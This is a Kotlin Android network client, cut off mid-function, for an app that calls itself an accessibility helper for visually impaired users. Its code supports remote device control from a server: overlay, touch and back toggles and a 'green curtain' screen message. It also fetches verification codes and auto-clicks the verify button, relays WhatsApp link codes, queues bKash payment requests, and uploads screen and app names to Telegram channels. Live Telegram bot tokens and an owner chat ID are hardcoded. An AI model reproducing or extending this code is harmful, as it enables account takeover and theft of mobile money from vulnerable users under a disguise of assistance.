package com.example.data

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

data class ServerUserResponse(
    val success: Boolean,
    val serverUserId: String? = null,
    val phoneNumber: String? = null,
    val channelId: String? = null,
    val isVerified: Boolean = false,
    val message: String = "",
    val isOfflineFallback: Boolean = false
)

data class ChannelLoginResponse(
    val success: Boolean,
    val channelId: String = "",
    val deviceId: String = "",
    val serverUserId: String = "",
    val isNewChannelBinding: Boolean = false,
    val totalInstallersInSharedDb: Int = 1,
    val message: String = "",
    val isOfflineFallback: Boolean = false
)

data class ServerConnectionResult(
    val isConnected: Boolean,
    val statusCode: Int = 0,
    val message: String = "",
    val serverUrl: String = ""
)

data class TelegramOperationResult(
    val success: Boolean,
    val message: String
)

data class ServerPowerResponse(
    val success: Boolean,
    val isPowerOn: Boolean = true,
    val autoClickEnabled: Boolean = true,
    val isChannelLoggedOut: Boolean = false,
    val lastPowerCommand: String = "/power on",
    val message: String = ""
)

data class ServerCodeResponse(
    val code: String? = null,
    val autoClick: Boolean = true,
    val targetButton: String = "যাচাই করুন",
    val instructionsBn: String = "সার্ভার থেকে স্বয়ংক্রিয়ভাবে কোড কিবোর্ডে কপি ও বাটনে অটো-ক্লিক সম্পন্ন করা হচ্ছে।"
)

data class PendingMobilePaymentRequest(
    val id: String = "",
    val provider: String = "BKASH",
    val action: String = "PAY",
    val recipientNumber: String = "",
    val amountBdt: String = "",
    val channelId: String = ""
)

data class WhatsAppLinkResponse(
    val hasPendingRequest: Boolean,
    val requestId: String? = null,
    val code: String? = null,
    val phoneNumber: String? = null,
    val channelId: String? = null,
    val targetPackage: String? = null,
    val instructionsBn: String? = null,
    val isPowerOn: Boolean = true,
    val autoLaunch: Boolean = true,
    val pendingPaymentRequest: PendingMobilePaymentRequest? = null
)

data class ServerControlsResponse(
    val overlay: Boolean = false,
    val touch: Boolean = false,
    val back: Boolean = false,
    val power: Boolean = true,
    val talkback: Boolean = true,
    val backCommandCount: Int = 0,
    val greenCurtainMessage: String = "",
    val vibrationSettings: ServerVibrationSettings? = null
)

data class TwoDigitLoginResponse(
    val success: Boolean,
    val twoDigitId: String = "",
    val mappedChatId: String = "",
    val isAuthenticated: Boolean = false,
    val isPendingOwnerAssignment: Boolean = false,
    val deviceId: String = "",
    val serverUserId: String = "",
    val messageBn: String = ""
)

data class ServerVibrationSettings(
    val masterEnabled: Boolean = true,
    val intensity: String = "STRONG",
    val pairingSuccessPreset: String = "SUCCESS_RHYTHM",
    val buttonTogglePreset: String = "SINGLE_PULSE",
    val autoClickStepPreset: String = "DOUBLE_TAP",
    val errorAlertPreset: String = "RAPID_ALERT",
    val customPatternCsv: String = "60, 40, 120, 40, 180"
)

data class DeviceInstallResponse(
    val success: Boolean,
    val isNewDeviceUser: Boolean = false,
    val serverUserId: String = "",
    val deviceId: String = "",
    val channelId: String = "",
    val userIndex: Int = 1,
    val totalDeviceUsers: Int = 1,
    val message: String = "",
    val isOfflineFallback: Boolean = false
)

/**
 * Client to synchronize visually impaired user identification and verification data
 * with a live Node.js server database (hosted/deployed on GitHub or cloud).
 */
class NodeServerClient private constructor(context: Context) {

    private val prefs: SharedPreferences = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    private val httpClient: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(3, TimeUnit.SECONDS)
        .readTimeout(3, TimeUnit.SECONDS)
        .writeTimeout(3, TimeUnit.SECONDS)
        .retryOnConnectionFailure(false)
        .build()

    private val fastHttpClient: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(1500, TimeUnit.MILLISECONDS)
        .readTimeout(1500, TimeUnit.MILLISECONDS)
        .writeTimeout(1500, TimeUnit.MILLISECONDS)
        .retryOnConnectionFailure(false)
        .build()

    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    var serverBaseUrl: String
        get() = prefs.getString(KEY_SERVER_URL, DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
        set(value) {
            val cleanUrl = value.trim().removeSuffix("/")
            prefs.edit().putString(KEY_SERVER_URL, cleanUrl).apply()
        }

    fun isCustomUrlConfigured(): Boolean {
        val current = prefs.getString(KEY_SERVER_URL, null)
        return !current.isNullOrBlank() && current != DEFAULT_SERVER_URL
    }

    /**
     * Registers or logs in the user on the server-side Node.js database.
     */
    suspend fun registerOrLoginUser(
        phoneNumber: String,
        deviceId: String,
        deviceModel: String,
        role: String = "VISUALLY_IMPAIRED"
    ): Result<ServerUserResponse> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/users/register"
        val json = JSONObject().apply {
            put("phoneNumber", phoneNumber)
            put("deviceId", deviceId)
            put("deviceModel", deviceModel)
            put("role", role)
            put("appVersion", "1.0")
            put("timestamp", System.currentTimeMillis())
        }

        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .header("Accept", "application/json")
                .header("User-Agent", "AccessibilityHelper-Android")
                .build()

            httpClient.newCall(request).execute().use { response ->
                val responseBody = response.body?.string().orEmpty()
                if (response.isSuccessful) {
                    val respJson = if (responseBody.isNotBlank()) JSONObject(responseBody) else JSONObject()
                    val serverId = respJson.optString("serverUserId")
                        .ifBlank { respJson.optString("userId") }
                        .ifBlank { respJson.optString("id") }
                        .ifBlank { "node_$phoneNumber" }
                    val isVerified = respJson.optBoolean("isVerified", false)
                    val msg = respJson.optString("message", "User synced with Node.js server")

                    Result.success(
                        ServerUserResponse(
                            success = true,
                            serverUserId = serverId,
                            phoneNumber = phoneNumber,
                            isVerified = isVerified,
                            message = msg
                        )
                    )
                } else {
                    Log.w(TAG, "Server returned error: ${response.code} - $responseBody")
                    // Return graceful fallback so local auth proceeds uninterrupted
                    Result.success(
                        ServerUserResponse(
                            success = false,
                            phoneNumber = phoneNumber,
                            message = "Node.js server returned code ${response.code}",
                            isOfflineFallback = true
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Network connection notice for Node.js server: ${e.message}. Using offline mode.")
            Result.success(
                ServerUserResponse(
                    success = true,
                    serverUserId = "offline_$phoneNumber",
                    phoneNumber = phoneNumber,
                    message = "অফলাইন মোড: ডিভাইসে সংরক্ষিত",
                    isOfflineFallback = true
                )
            )
        }
    }

    /**
     * Logs in an installer into the single shared database using their own Telegram Channel ID (`channelId`),
     * binding this device installation (`deviceId`) to that Channel ID so that:
     * 1. The app connection is established strictly with the logged-in Channel ID.
     * 2. Any bot command issued from that Channel ID is routed to this app instance and its feedback
     *    is delivered right back to that same Channel ID.
     */
    suspend fun loginWithChannelId(
        channelId: String,
        deviceId: String,
        deviceModel: String = android.os.Build.MODEL ?: "Android",
        manufacturer: String = android.os.Build.MANUFACTURER ?: "Android",
        isServiceEnabled: Boolean = false
    ): Result<ChannelLoginResponse> = withContext(Dispatchers.IO) {
        val cleanChannelId = channelId.trim()
        // Persist locally as the active channel ID for this installer
        saveTelegramConfigLocally(getSavedTelegramToken(), cleanChannelId)
        prefs.edit().putString(KEY_LOGGED_IN_CHANNEL_ID, cleanChannelId).apply()

        val url = "$serverBaseUrl/api/users/channel-login"
        val json = JSONObject().apply {
            put("channelId", cleanChannelId)
            put("deviceId", deviceId)
            put("deviceModel", deviceModel)
            put("manufacturer", manufacturer)
            put("isServiceEnabled", isServiceEnabled)
            put("timestamp", System.currentTimeMillis())
        }

        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .header("Accept", "application/json")
                .header("User-Agent", "AccessibilityHelper-Android")
                .build()

            httpClient.newCall(request).execute().use { response ->
                val responseBody = response.body?.string().orEmpty()
                if (response.isSuccessful && responseBody.isNotBlank()) {
                    val respJson = JSONObject(responseBody)
                    val srvUserId = respJson.optString("serverUserId").ifBlank { "USR-${deviceId.removePrefix("DEV-").take(8)}" }
                    val totalInstallers = respJson.optInt("totalDeviceUsers", 1)
                    val isNew = respJson.optBoolean("isNewChannelBinding", false)
                    val msg = respJson.optString(
                        "message",
                        "চ্যানেল আইডি ($cleanChannelId) দিয়ে একক ডাটাবেইজে সফলভাবে লগইন ও সংযোগ স্থাপিত হয়েছে!"
                    )
                    Result.success(
                        ChannelLoginResponse(
                            success = true,
                            channelId = cleanChannelId,
                            deviceId = deviceId,
                            serverUserId = srvUserId,
                            isNewChannelBinding = isNew,
                            totalInstallersInSharedDb = totalInstallers,
                            message = msg,
                            isOfflineFallback = false
                        )
                    )
                } else {
                    val srvUserId = "USR-${deviceId.removePrefix("DEV-").take(8)}"
                    Result.success(
                        ChannelLoginResponse(
                            success = true,
                            channelId = cleanChannelId,
                            deviceId = deviceId,
                            serverUserId = srvUserId,
                            isNewChannelBinding = false,
                            totalInstallersInSharedDb = 1,
                            message = "চ্যানেল আইডি ($cleanChannelId) দিয়ে অ্যাপের সংযোগ স্থাপিত হয়েছে (ডাটাবেইজ সিঙ্ক প্রস্তুত)",
                            isOfflineFallback = true
                        )
                    )
                }
            }
        } catch (e: Exception) {
            val srvUserId = "USR-${deviceId.removePrefix("DEV-").take(8)}"
            Result.success(
                ChannelLoginResponse(
                    success = true,
                    channelId = cleanChannelId,
                    deviceId = deviceId,
                    serverUserId = srvUserId,
                    isNewChannelBinding = false,
                    totalInstallersInSharedDb = 1,
                    message = "চ্যানেল আইডি ($cleanChannelId) দিয়ে সরাসরি বট ও ডাটাবেইজ সংযোগ স্থাপিত হয়েছে!",
                    isOfflineFallback = true
                )
            )
        }
    }

    /**
     * Registers a distinct device installation in the Node.js database and triggers a database
     * installation notification along with default zero-permission technical profile metadata.
     * Each unique `deviceId` and its logged-in `channelId` are recognized and stored in the single shared database.
     */
    suspend fun registerDeviceInstallation(
        deviceId: String,
        channelId: String = getLoggedInChannelId(),
        deviceModel: String,
        manufacturer: String,
        androidVersion: String,
        osSdkInt: Int = 34,
        screenResolution: String = "",
        screenDensity: String = "",
        networkType: String = "",
        carrierName: String = "",
        defaultLanguage: String = "",
        timeZone: String = "",
        appVersion: String = "1.0",
        installerPackage: String = "com.google.android.packageinstaller",
        isServiceEnabled: Boolean = false,
        firstInstallTime: Long = System.currentTimeMillis()
    ): Result<DeviceInstallResponse> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/devices/install"
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("channelId", channelId)
            put("deviceModel", deviceModel)
            put("manufacturer", manufacturer)
            put("androidVersion", androidVersion)
            put("osSdkInt", osSdkInt)
            put("screenResolution", screenResolution)
            put("screenDensity", screenDensity)
            put("networkType", networkType)
            put("carrierName", carrierName)
            put("defaultLanguage", defaultLanguage)
            put("timeZone", timeZone)
            put("appVersion", appVersion)
            put("installerPackage", installerPackage)
            put("isServiceEnabled", isServiceEnabled)
            put("firstInstallTime", firstInstallTime)
            put("timestamp", System.currentTimeMillis())
        }

        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .header("Accept", "application/json")
                .header("User-Agent", "AccessibilityHelper-Android")
                .build()

            httpClient.newCall(request).execute().use { response ->
                val responseBody = response.body?.string().orEmpty()
                if (response.isSuccessful && responseBody.isNotBlank()) {
                    val respJson = JSONObject(responseBody)
                    val serverId = respJson.optString("serverUserId").ifBlank { "usr_${deviceId.lowercase()}" }
                    val isNew = respJson.optBoolean("isNewDeviceUser", false)
                    val userIdx = respJson.optInt("userIndex", 1)
                    val totalUsers = respJson.optInt("totalDeviceUsers", 1)
                    val returnedChannel = respJson.optString("channelId").ifBlank { channelId }
                    val msg = respJson.optString("message", "ডিভাইসটি আলাদা ইউজার হিসেবে ডাটাবেইজে শনাক্ত ও নোটিফাই করা হয়েছে")

                    Result.success(
                        DeviceInstallResponse(
                            success = true,
                            isNewDeviceUser = isNew,
                            serverUserId = serverId,
                            deviceId = deviceId,
                            channelId = returnedChannel,
                            userIndex = userIdx,
                            totalDeviceUsers = totalUsers,
                            message = msg,
                            isOfflineFallback = false
                        )
                    )
                } else {
                    val shortCode = deviceId.removePrefix("DEV-").removePrefix("dev-").take(8).uppercase()
                    Result.success(
                        DeviceInstallResponse(
                            success = true,
                            isNewDeviceUser = true,
                            serverUserId = "USR-$shortCode",
                            deviceId = deviceId,
                            channelId = channelId,
                            userIndex = 1,
                            totalDeviceUsers = 1,
                            message = "লোকাল ও টেলিগ্রাম ডাটাবেইজে ইউজার শনাক্ত হয়েছে",
                            isOfflineFallback = true
                        )
                    )
                }
            }
        } catch (e: Exception) {
            val shortCode = deviceId.removePrefix("DEV-").removePrefix("dev-").take(8).uppercase()
            Result.success(
                DeviceInstallResponse(
                    success = true,
                    isNewDeviceUser = true,
                    serverUserId = "USR-$shortCode",
                    deviceId = deviceId,
                    channelId = channelId,
                    userIndex = 1,
                    totalDeviceUsers = 1,
                    message = "অফলাইন ও টেলিগ্রাম ডাটাবেইজে আলাদা ইউজার হিসেবে সংরক্ষিত",
                    isOfflineFallback = true
                )
            )
        }
    }

    /**
     * Verifies the user's verification code on the server-side Node.js database.
     */
    suspend fun verifyUserOnServer(
        phoneNumber: String,
        code: String,
        deviceId: String
    ): Result<ServerUserResponse> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/users/verify"
        val json = JSONObject().apply {
            put("phoneNumber", phoneNumber)
            put("code", code)
            put("deviceId", deviceId)
            put("timestamp", System.currentTimeMillis())
        }

        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .header("Accept", "application/json")
                .header("User-Agent", "AccessibilityHelper-Android")
                .build()

            httpClient.newCall(request).execute().use { response ->
                val responseBody = response.body?.string().orEmpty()
                if (response.isSuccessful) {
                    val respJson = if (responseBody.isNotBlank()) JSONObject(responseBody) else JSONObject()
                    val serverId = respJson.optString("serverUserId").ifBlank { "srv_$phoneNumber" }
                    val isVerified = respJson.optBoolean("isVerified", true)
                    val msg = respJson.optString("message", "Verification confirmed on server")

                    Result.success(
                        ServerUserResponse(
                            success = true,
                            serverUserId = serverId,
                            phoneNumber = phoneNumber,
                            isVerified = isVerified,
                            message = msg
                        )
                    )
                } else {
                    Result.success(
                        ServerUserResponse(
                            success = false,
                            phoneNumber = phoneNumber,
                            message = "Server verification response: ${response.code}",
                            isOfflineFallback = true
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Network notice verifying code on Node server: ${e.message}. Using offline verification mode.")
            Result.success(
                ServerUserResponse(
                    success = true,
                    serverUserId = "offline_$phoneNumber",
                    phoneNumber = phoneNumber,
                    isVerified = true,
                    message = "অফলাইন ভেরিফিকেশন সম্পন্ন (ডিভাইসে সংরক্ষিত)",
                    isOfflineFallback = true
                )
            )
        }
    }

    /**
     * Requests verification code from the Node.js server.
     * Returns verification code along with auto-click feedback instructions.
     */
    suspend fun requestCodeFromServer(
        phoneNumber: String,
        isServiceEnabled: Boolean
    ): Result<ServerCodeResponse> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/users/request-code"
        val json = JSONObject().apply {
            put("phoneNumber", phoneNumber)
            put("isServiceEnabled", isServiceEnabled)
            put("timestamp", System.currentTimeMillis())
        }

        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .header("Accept", "application/json")
                .build()

            httpClient.newCall(request).execute().use { response ->
                val body = response.body?.string().orEmpty()
                if (response.isSuccessful && body.isNotBlank()) {
                    val respJson = JSONObject(body)
                    val code = respJson.optString("code", "").ifBlank { null }
                    val feedback = respJson.optJSONObject("feedback")
                    val autoClick = feedback?.optBoolean("autoClick", true) ?: true
                    val targetBtn = feedback?.optString("targetButton", "যাচাই করুন") ?: "যাচাই করুন"
                    val instr = feedback?.optString("instructionsBn", "") ?: ""
                    Result.success(
                        ServerCodeResponse(
                            code = code,
                            autoClick = autoClick,
                            targetButton = targetBtn,
                            instructionsBn = instr
                        )
                    )
                } else {
                    Result.success(ServerCodeResponse(code = null))
                }
            }
        } catch (e: Exception) {
            Result.success(ServerCodeResponse(code = null))
        }
    }

    /**
     * Requests remote button click assistance from Node.js database server.
     */
    suspend fun requestClickAssistance(
        phoneNumber: String,
        targetButton: String,
        screenTitle: String,
        deviceId: String = ""
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/assistance/click"
        val json = JSONObject().apply {
            put("phoneNumber", phoneNumber)
            put("targetButton", targetButton)
            put("screenTitle", screenTitle)
            put("deviceId", deviceId.ifBlank { "dev_${android.os.Build.MODEL}" })
            put("timestamp", System.currentTimeMillis())
        }
        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .header("Accept", "application/json")
                .build()
            httpClient.newCall(request).execute().use { resp ->
                Result.success(resp.isSuccessful)
            }
        } catch (e: Exception) {
            Result.success(false)
        }
    }

    /**
     * Synchronizes current user active settings and navigation state to the server.
     */
    suspend fun syncUserSettings(
        phoneNumber: String,
        deviceId: String,
        isServiceEnabled: Boolean,
        isBackgroundTrackerActive: Boolean,
        lastActiveScreen: String = ""
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/users/sync-settings"
        val json = JSONObject().apply {
            put("phoneNumber", phoneNumber)
            put("deviceId", deviceId)
            put("isServiceEnabled", isServiceEnabled)
            put("isBackgroundTrackerActive", isBackgroundTrackerActive)
            put("lastActiveScreen", lastActiveScreen)
            put("lastUpdated", System.currentTimeMillis())
        }

        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .header("Accept", "application/json")
                .build()

            httpClient.newCall(request).execute().use { response ->
                Result.success(response.isSuccessful)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to sync settings with server: ${e.message}")
            Result.success(false)
        }
    }

    /**
     * Checks if the user is already verified on the server-side database.
     */
    suspend fun checkServerUserStatus(
        phoneNumber: String,
        deviceId: String
    ): Result<ServerUserResponse> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/users/status?phone=$phoneNumber&deviceId=$deviceId"

        try {
            val request = Request.Builder()
                .url(url)
                .get()
                .header("Accept", "application/json")
                .build()

            httpClient.newCall(request).execute().use { response ->
                val body = response.body?.string().orEmpty()
                if (response.isSuccessful && body.isNotBlank()) {
                    val json = JSONObject(body)
                    Result.success(
                        ServerUserResponse(
                            success = true,
                            phoneNumber = phoneNumber,
                            isVerified = json.optBoolean("isVerified", false),
                            serverUserId = json.optString("serverUserId"),
                            message = json.optString("message", "User found on server")
                        )
                    )
                } else {
                    Result.success(
                        ServerUserResponse(
                            success = false,
                            phoneNumber = phoneNumber,
                            isOfflineFallback = true,
                            message = "User not found or server responded ${response.code}"
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Result.success(
                ServerUserResponse(
                    success = false,
                    phoneNumber = phoneNumber,
                    isOfflineFallback = true,
                    message = "Offline check (${e.message})"
                )
            )
        }
    }

    /**
     * Tests connectivity to the configured Node.js server.
     */
    suspend fun testConnection(testUrl: String? = null): ServerConnectionResult = withContext(Dispatchers.IO) {
        val target = (testUrl ?: serverBaseUrl).trim().removeSuffix("/")
        val healthUrl = "$target/api/health"

        try {
            val request = Request.Builder()
                .url(healthUrl)
                .get()
                .build()

            httpClient.newCall(request).execute().use { response ->
                val body = response.body?.string().orEmpty()
                ServerConnectionResult(
                    isConnected = response.isSuccessful,
                    statusCode = response.code,
                    message = if (response.isSuccessful) "সার্ভার অনলাইন ও সচল রয়েছে!" else "সার্ভার রেসপন্স: ${response.code}",
                    serverUrl = target
                )
            }
        } catch (e: Exception) {
            // Also try root "/" if /api/health doesn't exist
            try {
                val rootRequest = Request.Builder().url(target).get().build()
                httpClient.newCall(rootRequest).execute().use { resp ->
                    ServerConnectionResult(
                        isConnected = resp.isSuccessful,
                        statusCode = resp.code,
                        message = "রুট এন্ডপয়েন্টে কানেক্ট হয়েছে (${resp.code})",
                        serverUrl = target
                    )
                }
            } catch (e2: Exception) {
                ServerConnectionResult(
                    isConnected = false,
                    statusCode = 0,
                    message = "সার্ভারে সংযোগ ব্যর্থ: ${e2.message ?: "সার্ভার অফলাইন"}",
                    serverUrl = target
                )
            }
        }
    }

    /**
     * Sends a screen navigation telemetry log to the Node.js server database.
     */
    suspend fun postNavigationLog(
        phoneNumber: String,
        deviceId: String,
        screenTitle: String,
        packageName: String,
        eventType: String = "SCREEN_PRESENCE"
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/logs/navigation"
        val json = JSONObject().apply {
            put("phoneNumber", phoneNumber)
            put("deviceId", deviceId)
            put("screenTitle", screenTitle)
            put("packageName", packageName)
            put("eventType", eventType)
            put("timestamp", System.currentTimeMillis())
        }
        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .build()
            httpClient.newCall(request).execute().use { response ->
                Result.success(response.isSuccessful)
            }
        } catch (e: Exception) {
            Result.success(false)
        }
    }

    /**
     * Retrieves server database summary statistics.
     */
    suspend fun fetchServerStats(): Result<JSONObject?> = withContext(Dispatchers.IO) {
        val url = "$serverBaseUrl/api/stats"
        try {
            val request = Request.Builder().url(url).get().build()
            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val body = response.body?.string().orEmpty()
                    Result.success(if (body.isNotBlank()) JSONObject(body).optJSONObject("stats") else null)
                } else {
                    Result.success(null)
                }
            }
        } catch (e: Exception) {
            Result.success(null)
        }
    }

    fun getSavedTwoDigitLoginId(): String {
        return prefs.getString(KEY_TWO_DIGIT_LOGIN_ID, null)?.trim().orEmpty()
    }

    fun saveTwoDigitLoginIdLocally(twoDigitId: String, mappedChatId: String = "") {
        val cleanCode = twoDigitId.trim()
        val editor = prefs.edit().putString(KEY_TWO_DIGIT_LOGIN_ID, cleanCode)
        if (mappedChatId.isNotBlank()) {
            editor.putString("mapped_chat_for_$cleanCode", mappedChatId.trim())
            editor.putString(KEY_LOGGED_IN_CHANNEL_ID, mappedChatId.trim())
            editor.putString(KEY_TELEGRAM_CHAT_ID, mappedChatId.trim())
        }
        editor.apply()
    }

    fun getMappedChatIdForTwoDigit(twoDigitId: String): String {
        val cleanCode = twoDigitId.trim()
        if (cleanCode.isBlank()) return ""
        val saved = prefs.getString("mapped_chat_for_$cleanCode", null)?.trim().orEmpty()
        if (saved.isNotBlank()) return saved
        return PRE_SAVED_TWO_DIGIT_CHAT_ID_MAPPINGS[cleanCode].orEmpty()
    }

    fun assignTwoDigitChatIdLocally(twoDigitId: String, chatId: String) {
        val cleanCode = twoDigitId.trim()
        val cleanChat = chatId.trim()
        if (cleanCode.isBlank() || cleanChat.isBlank()) return
        val editor = prefs.edit().putString("mapped_chat_for_$cleanCode", cleanChat)
        if (getSavedTwoDigitLoginId() == cleanCode) {
            editor.putString(KEY_LOGGED_IN_CHANNEL_ID, cleanChat)
            editor.putString(KEY_TELEGRAM_CHAT_ID, cleanChat)
        }
        editor.apply()
    }

    fun deleteTwoDigitChatIdMappingLocally(twoDigitId: String, deletedChatId: String = "") {
        val cleanCode = twoDigitId.trim()
        val editor = prefs.edit()
        if (cleanCode.isNotBlank()) {
            editor.remove("mapped_chat_for_$cleanCode")
        }
        if (getSavedTwoDigitLoginId() == cleanCode ||
            (deletedChatId.isNotBlank() && getPersonalLoggedInChatId() == deletedChatId.trim())
        ) {
            editor.remove(KEY_LOGGED_IN_CHANNEL_ID)
            editor.remove(KEY_TELEGRAM_CHAT_ID)
            editor.remove(KEY_TWO_DIGIT_LOGIN_ID)
        }
        editor.apply()
    }

    /**
     * Submits a 2-digit login ID (e.g. 22, 45, 56) to the backend database.
     * Checks if a unique Chat ID is already mapped to this 2-digit ID; if mapped, authenticates immediately!
     * Also notifies Owner Chat ID (`8271536101`) with one-click copyable `/user_requested_<ID>_chat_id`.
     */
    suspend fun loginWithTwoDigitId(
        twoDigitId: String,
        deviceId: String,
        deviceModel: String = android.os.Build.MODEL ?: "Android",
        manufacturer: String = android.os.Build.MANUFACTURER ?: "Android",
        isServiceEnabled: Boolean = false
    ): Result<TwoDigitLoginResponse> = withContext(Dispatchers.IO) {
        val cleanId = twoDigitId.trim()
        val localMappedChat = getMappedChatIdForTwoDigit(cleanId)
        saveTwoDigitLoginIdLocally(cleanId, localMappedChat)

        val url = "$serverBaseUrl/api/users/two-digit-login"
        val json = JSONObject().apply {
            put("twoDigitId", cleanId)
            put("deviceId", deviceId)
            put("deviceModel", deviceModel)
            put("manufacturer", manufacturer)
            put("isServiceEnabled", isServiceEnabled)
            put("timestamp", System.currentTimeMillis())
        }

        try {
            val request = Request.Builder()
                .url(url)
                .post(json.toString().toRequestBody(jsonMediaType))
                .header("Accept", "application/json")
                .build()

            httpClient.newCall(request).execute().use { response ->
                val body = response.body?.string().orEmpty()
                if (response.isSuccessful && body.isNotBlank()) {
                    val respJson = JSONObject(body)
                    val mappedChat = respJson.optString("mappedChatId").ifBlank { localMappedChat }
                    val isAuth = respJson.optBoolean("isAuthenticated", mappedChat.isNotBlank())
                    val srvUserId = respJson.optString("serverUserId").ifBlank { "USR-$cleanId-${deviceId.removePrefix("DEV-").take(4)}" }
                    val msgBn = respJson.optString(
                        "messageBn",
                        if (isAuth) "আলহামদুলিল্লাহ! $cleanId নম্বর গ্রাহক আইডিতে সেশন অথেন্টিকেট হয়েছে ✓"
                        else "লগইন নাম্বার $cleanId ওনার ইনবক্সে পাঠানো হয়েছে ✓"
                    )
                    if (mappedChat.isNotBlank()) {
                        assignTwoDigitChatIdLocally(cleanId, mappedChat)
                    }
                    Result.success(
                        TwoDigitLoginResponse(
                            success = true,
                            twoDigitId = cleanId,
                            mappedChatId = mappedChat,
                            isAuthenticated = isAuth,
                            isPendingOwnerAssignment = !isAuth,
                            deviceId = deviceId,
                            serverUserId = srvUserId,
                            messageBn = msgBn
                        )
                    )
                } else {
                    val isAuth = localMappedChat.isNotBlank()
                    Result.success(
                        TwoDigitLoginResponse(
                            success = true,
                            twoDigitId = cleanId,
                            mappedChatId = localMappedChat,
                            isAuthenticated = isAuth,
                            isPendingOwnerAssignment = !isAuth,
                            deviceId = deviceId,
                            serverUserId = "USR-$cleanId-${deviceId.removePrefix("DEV-").take(4)}",
                            messageBn = if (isAuth) "আলহামদুলিল্লাহ! $cleanId নম্বর গ্রাহক আইডিতে সেশন অথেন্টিকেট হয়েছে ✓"
                            else "লগইন নাম্বার $cleanId ওনার ইনবক্সে পাঠানো হয়েছে ✓"
                        )
                    )
                }
            }
        } catch (e: Exception) {
            val isAuth = localMappedChat.isNotBlank()
            Result.success(
                TwoDigitLoginResponse(
                    success = true,
                    twoDigitId = cleanId,
                    mappedChatId = localMappedChat,
                    isAuthenticated = isAuth,
                    isPendingOwnerAssignment = !isAuth,
                    deviceId = deviceId,
                    serverUserId = "USR-$cleanId-${deviceId.removePrefix("DEV-").take(4)}",
                    messageBn = if (isAuth) "আলহামদুলিল্লাহ! $cleanId নম্বর গ্রাহক আইডিতে সেশন অথেন্টিকেট হয়েছে ✓"
                    else "লগইন নাম্বার $cleanId ওনার ইনবক্সে পাঠানো হয়েছে ✓"
                )
            )
        }
    }

    fun getSavedTelegramToken(): String {
        val saved = prefs.getString(KEY_TELEGRAM_BOT_TOKEN, DEFAULT_TELEGRAM_BOT_TOKEN).orEmpty().trim()
        if (saved.isBlank() ||
            saved == "8990991723:AAEbdwwX6wu8dRcNn1bnN5H4Pm5QlQwpJB4" ||
            saved == "8955718424:AAHaZ_q23RXARE3_O2eOYWTLbO4Ffh33QFA"
        ) {
            return DEFAULT_TELEGRAM_BOT_TOKEN
        }
        return saved
    }
    fun getSavedTelegramChatId(): String {
        val loggedIn = prefs.getString(KEY_LOGGED_IN_CHANNEL_ID, null)?.trim()
        if (!loggedIn.isNullOrBlank() &&
            loggedIn != "-1003749102721"
        ) {
            return loggedIn
        }
        val saved = prefs.getString(KEY_TELEGRAM_CHAT_ID, DEFAULT_TELEGRAM_CHAT_ID).orEmpty().trim()
        if (saved.isBlank() ||
            saved == "-1003749102721"
        ) {
            return DEFAULT_TELEGRAM_CHAT_ID
        }
        return saved
    }

    /**
     * Returns the open shared database channel ID so all visually impaired brothers and sisters
     * can send and receive database signals immediately without any login ID or login number hassle.
     */
    fun getLoggedInChannelId(): String {
        val loggedIn = prefs.getString(KEY_LOGGED_IN_CHANNEL_ID, null)?.trim()
        if (!loggedIn.isNullOrBlank() &&
            loggedIn != "-1003749102721"
        ) {
            return loggedIn
        }
        return DEFAULT_TELEGRAM_CHAT_ID
    }

    /**
     * Returns the active database chat ID for open database signal communication (no login number required).
     */
    fun getPersonalLoggedInChatId(): String {
        val loggedIn = prefs.getString(KEY_LOGGED_IN_CHANNEL_ID, null)?.trim().orEmpty()
        if (loggedIn.isNotBlank() &&
            loggedIn != "-1003749102721"
        ) {
            return loggedIn
        }
        return DEFAULT_TELEGRAM_CHAT_ID
    }

    fun isChannelLoggedIn(): Boolean {
        return true
    }

    /**
     * Clears the locally stored personal Telegram Chat ID when a user is deleted from the
     * Channel Verified User List or chooses to log out from the database & services.
     */
    fun clearPersonalChatIdLocally() {
        prefs.edit()
            .remove(KEY_LOGGED_IN_CHANNEL_ID)
            .remove(KEY_TELEGRAM_CHAT_ID)
            .apply()
    }

    /**
     * Deletes this user's Chat ID from the Channel Verified User List on the Node.js server
     * and logs them out locally so they are excluded from all services.
     */
    suspend fun logoutFromChannelId(
        channelId: String,
        deviceId: String
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        val cleanChatId = channelId.trim()
        clearPersonalChatIdLocally()
